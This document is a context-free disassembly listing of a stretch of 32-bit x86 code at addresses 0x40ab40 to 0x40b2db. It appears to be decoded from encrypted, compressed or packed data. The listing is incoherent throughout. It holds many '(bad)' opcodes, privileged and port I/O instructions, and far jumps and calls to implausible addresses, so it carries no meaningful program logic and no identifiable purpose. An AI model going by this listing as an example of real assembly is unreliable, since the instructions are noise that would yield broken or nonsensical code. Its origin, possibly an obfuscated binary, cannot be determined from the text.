  40ab40:	loop   0x40ab19
  40ab42:	mov    edi,0x4467bd53
  40ab47:	dec    edx
  40ab48:	sub    edi,DWORD PTR [ebx+0x49]
  40ab4b:	xchg   ebx,eax
  40ab4c:	nop
  40ab4d:	sub    BYTE PTR [ecx],bl
  40ab4f:	xchg   ecx,eax
  40ab50:	outs   dx,BYTE PTR ds:[esi]
  40ab51:	ins    DWORD PTR es:[edi],dx
  40ab52:	outs   dx,DWORD PTR ds:[esi]
  40ab53:	dec    esi
  40ab54:	mov    edx,0x9c654a32
  40ab59:	adc    BYTE PTR [esi],bl
  40ab5b:	int3   
  40ab5c:	cmp    eax,0x38a11524
  40ab61:	sti    
  40ab62:	fistp  DWORD PTR [ebx]
  40ab64:	enter  0xf074,0x7d
  40ab68:	in     al,dx
  40ab69:	mov    bh,0xb3
  40ab6b:	sub    ch,ch
  40ab6d:	mov    WORD PTR [ebx+0x53bfd5ee],?
  40ab73:	addr16 test ecx,eax
  40ab76:	dec    esi
  40ab77:	xlat   BYTE PTR ds:[ebx]
  40ab78:	shr    DWORD PTR [eax],1
  40ab7a:	test   ebx,esp
  40ab7c:	shl    DWORD PTR [edi-0x164e546d],0xd4
  40ab83:	(bad)  
  40ab84:	lock jge 0x40ab48
  40ab87:	xchg   DWORD PTR [edx-0x12b9d673],esi
  40ab8d:	cmp    ah,BYTE PTR [esi]
  40ab8f:	and    eax,0xe9a0cba0
  40ab94:	cld    
  40ab95:	mov    esi,0xccbc7553
  40ab9a:	adc    al,BYTE PTR [eax+0x48]
  40ab9d:	cmp    eax,0x4dd8a0d3
  40aba2:	call   esi
  40aba4:	lods   al,BYTE PTR ds:[esi]
  40aba5:	fadd   QWORD PTR [edx]
  40aba7:	fstp   QWORD PTR [ebx+eax*4+0x53]
  40abab:	mov    ebp,0x478b0fa1
  40abb0:	xor    eax,0xa7a88c31
  40abb5:	cmp    al,0x5
  40abb7:	es xor eax,0xf41b7376
  40abbd:	push   ss
  40abbe:	mov    dl,0x5e
  40abc0:	das    
  40abc1:	ret    0x9101
  40abc4:	inc    edx
  40abc5:	inc    eax
  40abc6:	repz push eax
  40abc8:	mov    BYTE PTR [esi],bl
  40abca:	or     al,0xf9
  40abcc:	jno    0x40ac42
  40abce:	mov    edx,0xe2d73889
  40abd3:	outs   dx,BYTE PTR ds:[esi]
  40abd4:	push   edx
  40abd5:	mov    eax,ds:0x6794690f
  40abda:	sub    al,0x7
  40abdc:	push   edx
  40abdd:	shl    DWORD PTR [ebx+0x44],cl
  40abe0:	rol    BYTE PTR [ebp-0x22],0xf2
  40abe4:	stos   BYTE PTR es:[edi],al
  40abe5:	sar    BYTE PTR [eax],cl
  40abe7:	sub    al,0xdf
  40abe9:	dec    edx
  40abea:	or     dh,cl
  40abec:	sub    al,0xb5
  40abee:	fst    QWORD PTR [edi]
  40abf0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40abf1:	xchg   esi,eax
  40abf2:	cli    
  40abf3:	aaa    
  40abf4:	aaa    
  40abf5:	or     ch,BYTE PTR [esi+0x73]
  40abf8:	mov    dh,0xf
  40abfa:	lds    esp,FWORD PTR [edx]
  40abfc:	push   ebx
  40abfd:	(bad)  [ebx+0x79f2c969]
  40ac03:	inc    ebx
  40ac04:	mov    ebx,0x82b9719e
  40ac09:	int3   
  40ac0a:	xor    di,WORD PTR [edx+0xf]
  40ac0e:	repnz int 0xc4
  40ac11:	fwait
  40ac12:	or     esp,DWORD PTR [ebp+0x1af19b8c]
  40ac18:	ins    BYTE PTR es:[edi],dx
  40ac19:	shr    BYTE PTR [edx],1
  40ac1b:	push   ebp
  40ac1c:	inc    eax
  40ac1d:	sbb    DWORD PTR [eax-0x431e5869],esi
  40ac23:	aaa    
  40ac24:	jmp    0x6839e52
  40ac29:	inc    ecx
  40ac2a:	scas   al,BYTE PTR es:[edi]
  40ac2b:	mov    ecx,0xb0ac1ae2
  40ac30:	dec    edx
  40ac31:	bound  esi,QWORD PTR [ebp+0xb9af1dd]
  40ac37:	mov    edx,0xbd1641df
  40ac3c:	push   ebp
  40ac3d:	retf   0xf4b3
  40ac40:	mov    bl,0x95
  40ac42:	mov    BYTE PTR [ebp+0x7a53bd99],0x42
  40ac49:	jbe    0x40acbd
  40ac4b:	fisubr DWORD PTR [ecx+0x7]
  40ac4e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ac4f:	jle    0x40ac39
  40ac51:	or     BYTE PTR [ebx+0x37e32dc8],bh
  40ac57:	cmp    ebp,DWORD PTR [ebx+0x3e]
  40ac5a:	mov    BYTE PTR [edi+0x45],dl
  40ac5d:	xor    al,0x8a
  40ac5f:	popa   
  40ac60:	data16 sbb al,BYTE PTR [ebx-0x5fdd9945]
  40ac67:	sub    bh,BYTE PTR [ecx]
  40ac69:	arpl   WORD PTR [edi-0x551a587d],sp
  40ac6f:	sub    eax,0xe6187884
  40ac74:	adc    cl,BYTE PTR [edx-0x2aa7f1db]
  40ac7a:	fidiv  WORD PTR [esi+0x19f4795f]
  40ac80:	in     eax,0x2c
  40ac82:	leave  
  40ac83:	xchg   ecx,eax
  40ac84:	mov    esi,0x92b4998
  40ac89:	push   cs
  40ac8a:	clc    
  40ac8b:	scas   eax,DWORD PTR es:[edi]
  40ac8c:	sub    esp,edx
  40ac8e:	mov    edi,DWORD PTR ds:[ebp-0x39]
  40ac92:	retf   0x314b
  40ac95:	inc    edx
  40ac96:	mov    al,ds:0x45401e4d
  40ac9b:	retf   0x4ea4
  40ac9e:	fs ins DWORD PTR es:[edi],dx
  40aca0:	leave  
  40aca1:	sti    
  40aca2:	adc    ah,BYTE PTR [ecx]
  40aca4:	cmp    dl,BYTE PTR [eax-0x20187573]
  40acaa:	test   al,0xce
  40acac:	xor    esp,esp
  40acae:	lods   al,BYTE PTR ds:[esi]
  40acaf:	pop    es
  40acb0:	scas   eax,DWORD PTR es:[edi]
  40acb1:	leave  
  40acb2:	jne    0x40aceb
  40acb4:	clc    
  40acb5:	scas   eax,DWORD PTR es:[edi]
  40acb6:	cli    
  40acb7:	pop    esp
  40acb8:	adc    al,BYTE PTR [esi+0xd508d43]
  40acbe:	in     al,0x69
  40acc0:	xlat   BYTE PTR ds:[ebx]
  40acc1:	dec    edi
  40acc2:	jb     0x40acde
  40acc4:	sbb    DWORD PTR [edi],ebx
  40acc6:	jne    0x40acd1
  40acc8:	(bad)  
  40acc9:	fucom  st(2)
  40accb:	sbb    DWORD PTR [ecx],0xffffffbc
  40acce:	push   edx
  40accf:	add    bl,BYTE PTR [eax]
  40acd1:	mov    al,0xf1
  40acd3:	icebp  
  40acd4:	mov    eax,DWORD PTR [edi+0x62f0de17]
  40acda:	push   edx
  40acdb:	iret   
  40acdc:	in     al,dx
  40acdd:	inc    eax
  40acde:	mov    DWORD PTR [ebx+0x4],edx
  40ace1:	shl    DWORD PTR [ebp-0x39],0xa2
  40ace5:	retf   0xc632
  40ace8:	dec    esp
  40ace9:	outs   dx,BYTE PTR ds:[esi]
  40acea:	jne    0x40ac74
  40acec:	xchg   si,ax
  40acee:	out    dx,al
  40acef:	shl    BYTE PTR [ebx+0x66b391e],0xa4
  40acf6:	mov    WORD PTR [edx-0x1c],cs
  40acf9:	sbb    eax,edi
  40acfb:	idiv   di
  40acfe:	push   0x72
  40ad00:	fcom   DWORD PTR [ecx]
  40ad02:	mov    ch,0xbe
  40ad04:	or     al,0xb8
  40ad06:	mov    bl,0xf8
  40ad08:	mov    ecx,0x5a7edf44
  40ad0d:	push   edx
  40ad0e:	mov    al,ds:0x7ab64210
  40ad13:	(bad)
  40ad17:	scas   eax,DWORD PTR es:[edi]
  40ad18:	scas   eax,DWORD PTR es:[edi]
  40ad19:	in     eax,dx
  40ad1a:	daa    
  40ad1b:	dec    esp
  40ad1c:	adc    ch,0x98
  40ad1f:	and    DWORD PTR [edi+0x7e],edi
  40ad22:	pop    eax
  40ad23:	icebp  
  40ad24:	cmp    esp,0xad5b3bea
  40ad2a:	and    dl,0x43
  40ad2d:	adc    BYTE PTR [eax-0x4f884ea1],dh
  40ad33:	add    BYTE PTR [edx-0x3d3e47bb],ah
  40ad39:	or     eax,0xe12af8ec
  40ad3e:	push   ecx
  40ad3f:	and    DWORD PTR [ecx],ebx
  40ad41:	repnz mov cl,0x4
  40ad44:	sub    cl,BYTE PTR [edi-0x4d]
  40ad47:	pop    es
  40ad48:	pswapd mm5,QWORD PTR [esi+ebx*1]
  40ad4d:	dec    eax
  40ad4e:	aas    
  40ad4f:	jns    0x40ad1a
  40ad51:	addr16 mov edx,0x480e2df5
  40ad57:	jmp    0xe512d261
  40ad5c:	in     al,0x8e
  40ad5e:	and    dh,bl
  40ad60:	inc    ecx
  40ad61:	loopne 0x40addf
  40ad63:	clc    
  40ad64:	test   eax,0xc3a05aab
  40ad69:	test   BYTE PTR [esi],bl
  40ad6b:	sahf   
  40ad6c:	daa    
  40ad6d:	inc    ecx
  40ad6e:	xchg   ecx,eax
  40ad70:	mov    ecx,0x178dc23a
  40ad75:	xchg   esi,eax
  40ad76:	mov    esi,ebp
  40ad78:	xor    bh,BYTE PTR [edi+0x3d]
  40ad7b:	bnd jne 0x40adee
  40ad7e:	xor    esp,DWORD PTR [eax+edx*1+0x12]
  40ad82:	stc    
  40ad83:	or     eax,0x418a9170
  40ad88:	iret   
  40ad89:	(bad)  
  40ad8a:	out    dx,al
  40ad8b:	nop
  40ad8c:	loop   0x40adf4
  40ad8e:	(bad)  
  40ad8f:	lds    ecx,FWORD PTR [eax-0x640d796c]
  40ad95:	lds    ecx,FWORD PTR [edi]
  40ad97:	ret    0x3d64
  40ad9a:	xchg   ebp,eax
  40ad9b:	aam    0xd0
  40ad9d:	mov    bh,0x1c
  40ad9f:	mov    al,0x31
  40ada1:	inc    ebx
  40ada2:	inc    edi
  40ada3:	stos   DWORD PTR es:[edi],eax
  40ada4:	fidiv  WORD PTR [eax]
  40ada6:	cmp    bl,BYTE PTR [esp+ecx*4-0x2b]
  40adaa:	mov    BYTE PTR [eax],dh
  40adac:	dec    esi
  40adad:	test   ch,ch
  40adaf:	jb     0x40ad79
  40adb1:	and    al,0x46
  40adb4:	push   edx
  40adb5:	mov    bl,0xf3
  40adb8:	jbe    0x40adbd
  40adba:	pop    ebp
  40adbb:	xchg   DWORD PTR [ebx+0x3cbe0dba],ecx
  40adc1:	test   ch,bl
  40adc3:	dec    ebx
  40adc4:	ins    DWORD PTR es:[edi],dx
  40adc5:	adc    BYTE PTR [ebx+0x667b1d35],al
  40adcb:	fcom   DWORD PTR [ecx-0x45]
  40adce:	and    esp,ebx
  40add0:	mov    ch,0x80
  40add2:	pop    eax
  40add3:	scas   eax,DWORD PTR es:[di]
  40add5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40add6:	jmp    0x40ad58
  40add8:	(bad)  
  40add9:	and    DWORD PTR [edx],ecx
  40addb:	sub    ecx,0x1775bef1
  40ade1:	jne    0x40ad69
  40ade3:	sti    
  40ade4:	adc    al,0x67
  40ade6:	mov    ch,0xb
  40ade8:	out    0xb9,eax
  40adea:	inc    edi
  40adeb:	fwait
  40adec:	mov    ebx,0xdc4fd9dd
  40adf1:	add    DWORD PTR [eax-0x5b40bea1],edi
  40adf7:	inc    esi
  40adf8:	cli    
  40adf9:	mov    ecx,eax
  40adfb:	jbe    0x40ad86
  40adfd:	inc    ecx
  40adfe:	or     al,0x48
  40ae00:	outs   dx,BYTE PTR ds:[esi]
  40ae01:	(bad)  
  40ae02:	int3   
  40ae03:	out    0x15,eax
  40ae05:	jmp    0x4fe7:0xbd562d5f
  40ae0c:	sbb    ecx,DWORD PTR [eax+0x74]
  40ae0f:	test   BYTE PTR [ebx-0x76],bh
  40ae12:	mov    eax,ds:0xf17c0083
  40ae17:	out    0x1f,eax
  40ae19:	jg     0x40ad9f
  40ae1b:	or     DWORD PTR ds:0xa4e4da73,0x868134e6
  40ae25:	jl     0x40ae32
  40ae27:	test   DWORD PTR [ecx+0x78],eax
  40ae2a:	or     al,0xa8
  40ae2c:	div    BYTE PTR [edx+0x534c2f2e]
  40ae32:	sub    eax,0x5c6db7a7
  40ae37:	out    0xf6,al
  40ae39:	xchg   esp,eax
  40ae3a:	xor    DWORD PTR ds:0xea725392,0xffffff8e
  40ae41:	mov    WORD PTR [ebp+0x67],ds
  40ae44:	adc    DWORD PTR [ecx-0x5e2feaf2],edx
  40ae4a:	rol    BYTE PTR [ecx-0x5a],0x9f
  40ae4e:	fdiv   QWORD PTR [ecx-0x638a0e7b]
  40ae54:	scas   eax,DWORD PTR es:[edi]
  40ae55:	fs jge 0x40ae64
  40ae58:	mov    esi,0xed591717
  40ae5d:	out    dx,eax
  40ae5e:	push   ds
  40ae5f:	push   0xae57919f
  40ae64:	adc    DWORD PTR [ebx+ecx*4-0x12],0x14
  40ae69:	cmp    bl,BYTE PTR [edx+0x5b987828]
  40ae6f:	mov    eax,ds:0x1dfd28e6
  40ae74:	nop
  40ae75:	retf   0xe306
  40ae78:	sbb    DWORD PTR [eax-0x35],edi
  40ae7b:	add    cl,ah
  40ae7d:	test   BYTE PTR [ecx+edi*8],ah
  40ae80:	outs   dx,DWORD PTR ds:[esi]
  40ae81:	mov    ecx,0x5637c8ca
  40ae86:	shl    BYTE PTR [ebp+0x288f9eea],1
  40ae8c:	mov    esi,ds
  40ae8e:	sbb    al,0xc
  40ae90:	out    dx,eax
  40ae91:	mov    ebx,0x1f539b79
  40ae96:	mov    ecx,0xdd268bac
  40ae9b:	les    esi,FWORD PTR [ecx+0x3d892db7]
  40aea1:	cli    
  40aea2:	xor    BYTE PTR [eax-0x977709c],cl
  40aea8:	fisubr WORD PTR [edi-0x58]
  40aeab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aeac:	mov    ch,0x5a
  40aeae:	add    DWORD PTR [edx+ebp*1-0x554f2cd5],ebx
  40aeb5:	mov    ebx,0x36eefab9
  40aeba:	lock push ecx
  40aebc:	push   es
  40aebd:	scas   al,BYTE PTR es:[edi]
  40aebe:	sub    DWORD PTR [ebx-0x4f63a81c],ecx
  40aec4:	lock cmp BYTE PTR [esp+ecx*2+0xf81652],ah
  40aecc:	inc    ecx
  40aecd:	mov    BYTE PTR ds:0xc150552e,cl
  40aed3:	call   0x7736fde8
  40aed8:	(bad)  
  40aeda:	mov    ebx,0x9bcf668f
  40aedf:	mov    esp,0xfdfdb025
  40aee4:	es inc eax
  40aee6:	clc    
  40aee7:	ins    BYTE PTR es:[edi],dx
  40aee8:	repz (bad) 
  40aeea:	mov    ebx,0x6b98602f
  40aeef:	in     al,dx
  40aef0:	jecxz  0x40af71
  40aef2:	or     al,0xa6
  40aef4:	adc    BYTE PTR [ebp-0x17cd3693],bl
  40aefa:	add    al,0x7c
  40aefc:	cmp    al,0x8a
  40aefe:	dec    edi
  40aeff:	(bad)  
  40af00:	or     dh,cl
  40af02:	xchg   ecx,eax
  40af03:	fldenv [ebp+edi*1-0x4a88e8d5]
  40af0a:	shr    DWORD PTR [ebx+edi*8+0x5c],1
  40af0e:	loope  0x40af0c
  40af10:	es pusha 
  40af12:	xor    edx,ebp
  40af14:	mov    ah,0x4b
  40af16:	in     al,dx
  40af17:	mov    ebp,0x219b4f2c
  40af1c:	or     edx,0xd6d1f8b2
  40af22:	cmp    DWORD PTR [edi+0x542300],esp
  40af28:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40af29:	nop
  40af2a:	aaa    
  40af2b:	inc    eax
  40af2c:	arpl   WORD PTR [ebp-0x64],dx
  40af2f:	xor    edx,ebp
  40af31:	jmp    0x40af3a
  40af33:	mov    eax,ds:0x41ef5583
  40af38:	call   0x2fa:0xcf826b66
  40af3f:	and    bh,BYTE PTR [edi-0x34cae70f]
  40af45:	mov    ecx,0x251bc7be
  40af4a:	xchg   edi,eax
  40af4b:	shr    BYTE PTR [ebx+eiz*8+0x3d84682a],0xfb
  40af53:	mov    esp,0x3b9c19b8
  40af58:	popa   
  40af59:	hlt    
  40af5a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40af5b:	jno    0x40af2e
  40af5d:	inc    eax
  40af5f:	ret    0xebe3
  40af62:	gs js  0x40af22
  40af65:	jge    0x40afd7
  40af67:	adc    al,cl
  40af69:	sbb    al,0x6b
  40af6b:	bound  ebx,QWORD PTR [ebx+0x4b38e05e]
  40af71:	fcmovb st,st(2)
  40af73:	sbb    dl,BYTE PTR [edi-0x7ec99f1f]
  40af79:	das    
  40af7a:	ins    BYTE PTR es:[edi],dx
  40af7b:	mov    ch,BYTE PTR [esi-0x5c]
  40af7e:	out    0xea,al
  40af80:	dec    eax
  40af81:	mov    cl,BYTE PTR [ebx+0x69]
  40af84:	and    ch,BYTE PTR [eax]
  40af86:	jns    0x40af22
  40af88:	sbb    al,0xe9
  40af8a:	sbb    al,0xeb
  40af8c:	(bad)  
  40af8d:	fwait
  40af8e:	dec    edi
  40af8f:	jns    0x40af57
  40af91:	jbe    0x40af82
  40af93:	jmp    0x9576:0x90bfafe8
  40af9a:	jns    0x40af32
  40af9c:	mov    eax,ds:0xe25ca97
  40afa1:	mov    dl,0x56
  40afa3:	fstp   QWORD PTR [eax-0x694ed294]
  40afa9:	add    ah,bh
  40afab:	test   eax,0xcc23f73a
  40afb0:	dec    ecx
  40afb1:	adc    ebx,edi
  40afb3:	mov    dl,0xce
  40afb5:	repz je 0x40af92
  40afb8:	and    al,0x9f
  40afba:	bnd jnp 0x40af73
  40afbd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40afbe:	in     eax,0xb8
  40afc0:	pop    ebx
  40afc1:	jmp    0xda253394
  40afc6:	push   ss
  40afc7:	fld    TBYTE PTR [ebp+0x6db8b069]
  40afcd:	push   edi
  40afce:	mov    al,0x55
  40afd0:	ja     0x40af7e
  40afd2:	push   es
  40afd3:	aaa    
  40afd4:	or     ah,BYTE PTR [ebx]
  40afd6:	call   0x70f83114
  40afdb:	push   0xffffffa3
  40afdd:	out    0x94,eax
  40afdf:	popa   
  40afe0:	mov    edx,0xe61644fa
  40afe5:	push   es
  40afe6:	add    ch,al
  40afe8:	fnsave [ecx+0x5b]
  40afeb:	xor    al,BYTE PTR [ebx+0x47]
  40afee:	sub    DWORD PTR [eax-0x21],esi
  40aff1:	add    DWORD PTR ds:0xb7245207,ebp
  40aff7:	jnp    0x40affa
  40aff9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40affa:	and    eax,DWORD PTR [eax+edi*1+0x4fa6b25e]
  40b001:	jg     0x40afea
  40b003:	xor    DWORD PTR [ebx-0x66],edx
  40b006:	imul   eax,edx,0xe17de112
  40b00c:	jle    0x40b07f
  40b00e:	fisttp DWORD PTR [edi+0x8d525f5]
  40b014:	push   es
  40b015:	sub    DWORD PTR [edx+0x4b],esi
  40b018:	out    dx,al
  40b019:	sub    bh,BYTE PTR [ecx-0x3c]
  40b01c:	sub    BYTE PTR [bx+si+0x7743],ch
  40b021:	scas   al,BYTE PTR es:[edi]
  40b022:	push   esp
  40b023:	fcomp  DWORD PTR [ecx+0x3878b289]
  40b029:	and    al,0x6e
  40b02b:	jno    0x40b087
  40b02d:	mov    bl,0xf4
  40b02f:	rol    cl,0xbe
  40b032:	mov    al,ds:0x6ba69811
  40b037:	jg     0x40b003
  40b039:	or     al,0xbe
  40b03b:	adc    BYTE PTR [edx+0x85edc2a],ah
  40b041:	shr    DWORD PTR [ecx],1
  40b043:	es xor al,0xb3
  40b046:	loope  0x40afcc
  40b048:	out    0xcd,eax
  40b04a:	jmp    0xfefd2edf
  40b04f:	arpl   WORD PTR [esi+0x1bc8c645],si
  40b055:	pop    esi
  40b056:	or     BYTE PTR gs:[edx],al
  40b059:	mov    dh,0xe7
  40b05b:	cwde   
  40b05c:	cmp    bl,cl
  40b05e:	jne    0x40affd
  40b060:	fmul   st(4),st
  40b062:	push   ebx
  40b063:	js     0x40b091
  40b065:	mov    edx,0xd417845c
  40b06a:	aaa    
  40b06b:	add    BYTE PTR [esi+0x27],0x36
  40b06f:	fisub  WORD PTR [eax+0x79]
  40b072:	ficomp DWORD PTR [edx-0x32]
  40b075:	jo     0x40b02f
  40b077:	cmp    ebx,DWORD PTR [edx]
  40b079:	jnp    0x40b0d0
  40b07b:	pop    esp
  40b07c:	lock or DWORD PTR [ecx+0x658fe920],ecx
  40b083:	in     al,0x5d
  40b085:	and    al,0xde
  40b087:	jmp    0x1865dd21
  40b08c:	adc    DWORD PTR [edx+ebp*8],ebx
  40b08f:	cwde   
  40b090:	sbb    BYTE PTR [esi+0x40172e41],al
  40b096:	test   BYTE PTR [edx],bl
  40b098:	leave  
  40b099:	ins    DWORD PTR es:[edi],dx
  40b09a:	fld    DWORD PTR [esi-0x18cff848]
  40b0a0:	or     ebx,ebx
  40b0a2:	test   eax,0xaadb4ec9
  40b0a7:	push   esi
  40b0a8:	mov    bl,0xc5
  40b0aa:	jle    0x40b0ba
  40b0ac:	out    dx,eax
  40b0ad:	(bad)
  40b0b1:	hlt    
  40b0b2:	xchg   ecx,eax
  40b0b3:	test   eax,0xadd325ee
  40b0b8:	retf   
  40b0b9:	scas   al,BYTE PTR es:[edi]
  40b0ba:	add    al,0xc5
  40b0bc:	pusha  
  40b0bd:	jp     0x40b112
  40b0bf:	push   ds
  40b0c0:	ds loope 0x40b0ed
  40b0c3:	in     eax,dx
  40b0c4:	cs or  bh,dh
  40b0c7:	jmp    0xc0c3:0x3e04451a
  40b0ce:	pop    ebx
  40b0cf:	push   esp
  40b0d0:	inc    edx
  40b0d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b0d2:	mov    ebp,DWORD PTR [ebx-0x71]
  40b0d5:	push   ebp
  40b0d6:	aaa    
  40b0d7:	cmp    BYTE PTR [ecx],dl
  40b0d9:	scas   al,BYTE PTR es:[edi]
  40b0da:	xchg   ecx,eax
  40b0db:	inc    ecx
  40b0dc:	cld    
  40b0dd:	xor    eax,esp
  40b0df:	push   es
  40b0e0:	adc    edx,ebx
  40b0e2:	xchg   BYTE PTR [eax+edi*2-0x2ba23567],dl
  40b0e9:	into   
  40b0ea:	xor    DWORD PTR [edx-0x76900b76],esi
  40b0f0:	mov    ecx,0x6e9d5bf6
  40b0f5:	xor    bl,0x5f
  40b0f8:	test   al,0x9b
  40b0fa:	pop    ds
  40b0fb:	loope  0x40b159
  40b0fd:	dec    esi
  40b0fe:	sbb    eax,DWORD PTR [ebp+0x1a9e573f]
  40b104:	(bad)  [eax+0x59a3af13]
  40b10a:	or     DWORD PTR [ecx+0x46],esi
  40b10d:	or     cl,BYTE PTR [eax]
  40b10f:	xchg   DWORD PTR [edi],ebp
  40b111:	ja     0x40b0d5
  40b113:	xchg   ecx,eax
  40b114:	xchg   esi,eax
  40b115:	sbb    eax,0x2c78ada6
  40b11a:	jo     0x40b122
  40b11c:	mov    ebx,0x29c65be9
  40b121:	xchg   ebx,eax
  40b122:	hlt    
  40b123:	sbb    BYTE PTR [ebx-0x1e],ch
  40b126:	jns    0x40b10e
  40b128:	mov    dl,dl
  40b12a:	sbb    ch,BYTE PTR [ecx+0x18]
  40b12d:	add    al,0xe5
  40b12f:	pop    eax
  40b130:	and    esi,DWORD PTR [edx-0x33]
  40b133:	in     al,dx
  40b134:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b135:	adc    DWORD PTR [esi+0x14],esp
  40b138:	test   DWORD PTR [ebp-0x7d1550b1],edi
  40b13e:	xor    al,0xe9
  40b140:	test   al,0x5b
  40b142:	xchg   ebp,eax
  40b143:	and    BYTE PTR ds:0xf1165368,dh
  40b149:	and    bl,bl
  40b14b:	test   al,0xc7
  40b14d:	jg     0x40b1cc
  40b14f:	cmp    BYTE PTR gs:[eax+0x70f137fd],cl
  40b156:	push   ebp
  40b157:	inc    eax
  40b158:	push   ss
  40b159:	iret   
  40b15a:	lods   al,BYTE PTR ds:[esi]
  40b15b:	add    al,0x21
  40b15d:	push   cs
  40b15e:	call   0xaa45:0xde4f9c12
  40b165:	sti    
  40b166:	or     DWORD PTR [edi],edi
  40b168:	lahf   
  40b169:	inc    esp
  40b16a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b16b:	push   0xb
  40b16d:	jns    0x40b0fd
  40b16f:	fldcw  WORD PTR [edi]
  40b171:	es gs mov bl,0x15
  40b175:	jl     0x40b178
  40b177:	xchg   esp,eax
  40b178:	cli    
  40b179:	ss jnp 0x40b197
  40b17c:	imul   esi,edi,0x7d
  40b17f:	test   BYTE PTR [ecx],bl
  40b181:	and    al,ch
  40b183:	add    eax,0x801b0d65
  40b188:	xchg   DWORD PTR [edi+0x60],esp
  40b18b:	cs cs xor eax,0x4eea496a
  40b192:	jle    0x40b179
  40b194:	adc    ax,0x4345
  40b198:	enter  0x4c53,0x3a
  40b19c:	and    al,0x28
  40b19e:	test   eax,0xfe38935a
  40b1a3:	cli    
  40b1a4:	inc    ebx
  40b1a5:	stos   BYTE PTR es:[edi],al
  40b1a6:	jle    0x40b12d
  40b1a8:	and    dh,BYTE PTR [esp+ecx*8-0x73]
  40b1ac:	stos   BYTE PTR es:[edi],al
  40b1ad:	jle    0x40b145
  40b1af:	repnz push esi
  40b1b1:	mov    al,ds:0x5e3e7c15
  40b1b6:	or     eax,0x8c00c7d7
  40b1bb:	jo     0x40b167
  40b1bd:	bound  ebx,QWORD PTR [ebx]
  40b1bf:	xchg   edi,eax
  40b1c0:	popa   
  40b1c1:	in     eax,0x78
  40b1c3:	pushf  
  40b1c4:	jl     0x40b184
  40b1c6:	xchg   edx,eax
  40b1c7:	xchg   dh,dl
  40b1c9:	in     al,0xb7
  40b1cb:	(bad)  [ebx]
  40b1cd:	(bad)  
  40b1ce:	fldcw  WORD PTR [ebx+0x79967549]
  40b1d4:	fsub   DWORD PTR [esp+ecx*8]
  40b1d7:	outs   dx,BYTE PTR ds:[esi]
  40b1d8:	dec    esi
  40b1d9:	mov    al,ds:0xb1187fff
  40b1de:	push   ds
  40b1df:	xor    DWORD PTR [eax+esi*1-0x4a96b640],0xce4a0557
  40b1ea:	out    0x3d,eax
  40b1ec:	fild   DWORD PTR [esi-0x67]
  40b1ef:	arpl   WORD PTR [esi-0x24],sp
  40b1f2:	scas   al,BYTE PTR es:[edi]
  40b1f3:	inc    ebx
  40b1f4:	sbb    eax,0xdeee0698
  40b1f9:	sbb    DWORD PTR [edx-0x49],edx
  40b1fc:	das    
  40b1fd:	push   edx
  40b1fe:	and    eax,0x71798591
  40b203:	nop
  40b204:	inc    eax
  40b205:	pop    ebp
  40b206:	lock xchg edx,eax
  40b208:	lds    ecx,FWORD PTR [edi]
  40b20a:	iret   
  40b20b:	mov    ds:0x198c1804,al
  40b210:	fcmovb st,st(1)
  40b212:	scas   al,BYTE PTR es:[edi]
  40b213:	or     BYTE PTR [ebx+0x2e],ch
  40b216:	mov    BYTE PTR [ebp+0x13013400],al
  40b21c:	test   eax,0x698af43e
  40b221:	and    bh,cl
  40b223:	and    eax,0xd1c98bb5
  40b228:	cmp    edi,0x79
  40b22b:	xchg   DWORD PTR [esi+0x42960ce8],esp
  40b231:	cld    
  40b232:	jbe    0x40b1e8
  40b234:	mov    dl,0xb6
  40b236:	dec    ebp
  40b237:	fs ja  0x40b29f
  40b23a:	and    ch,BYTE PTR [eax+0x8]
  40b23d:	xor    DWORD PTR ds:0xb22a0c40,0x1190133b
  40b247:	push   esi
  40b248:	call   DWORD PTR [esi]
  40b24a:	push   ebx
  40b24b:	jg     0x40b209
  40b24d:	inc    BYTE PTR [eax-0x715ae2fc]
  40b253:	cmp    eax,eax
  40b255:	(bad)  
  40b256:	mov    cl,0xd7
  40b258:	pop    ds
  40b259:	adc    dh,ch
  40b25b:	enter  0x1226,0xa4
  40b25f:	es dec ebx
  40b261:	mov    al,ds:0x2984f8b4
  40b266:	jl     0x40b277
  40b268:	xor    al,0x67
  40b26a:	bound  esp,QWORD PTR [esi+0x33]
  40b26d:	out    dx,eax
  40b26e:	sar    DWORD PTR [eax+0x3ea53910],cl
  40b274:	loop   0x40b227
  40b276:	hlt    
  40b277:	sbb    edi,esi
  40b279:	pop    edi
  40b27a:	push   es
  40b27b:	clc    
  40b27c:	sbb    edx,DWORD PTR [edi+0x7]
  40b27f:	mov    al,0xd2
  40b281:	dec    ecx
  40b282:	test   eax,0x21713ca7
  40b287:	gs js  0x40b2b6
  40b28a:	and    BYTE PTR [ebx+0x33],0xc8
  40b28e:	call   0xdc0f:0xb4e2916a
  40b295:	pop    ds
  40b296:	pop    edi
  40b297:	ret    
  40b298:	pop    esp
  40b299:	add    edx,DWORD PTR ds:[esi-0x690643cf]
  40b2a0:	jmp    0x479a74e7
  40b2a5:	out    0x4d,al
  40b2a7:	ficom  WORD PTR [eax]
  40b2a9:	dec    edx
  40b2aa:	mov    edx,0xa5d965e8
  40b2af:	jo     0x40b2d8
  40b2b1:	mov    esi,DWORD PTR [eax+0x45f4465b]
  40b2b7:	pop    ds
  40b2b8:	jbe    0x40b297
  40b2ba:	jmp    DWORD PTR [ebp-0x15]
  40b2bd:	mov    ecx,0xfd1bc736
  40b2c2:	idiv   BYTE PTR [esi-0x1e]
  40b2c5:	push   ds
  40b2c6:	dec    ebx
  40b2c7:	pop    esp
  40b2c8:	ins    DWORD PTR es:[edi],dx
  40b2c9:	xchg   edi,edx
  40b2cb:	lods   eax,DWORD PTR ds:[esi]
  40b2cc:	pop    esi
  40b2cd:	pop    es
  40b2ce:	mov    ds:0x64c8e381,eax
  40b2d3:	outs   dx,BYTE PTR ds:[esi]
  40b2d4:	cmp    BYTE PTR [edi-0x5737ed31],cl
  40b2da:	pop    es
  40b2db:	addr16 ja 0x40b262
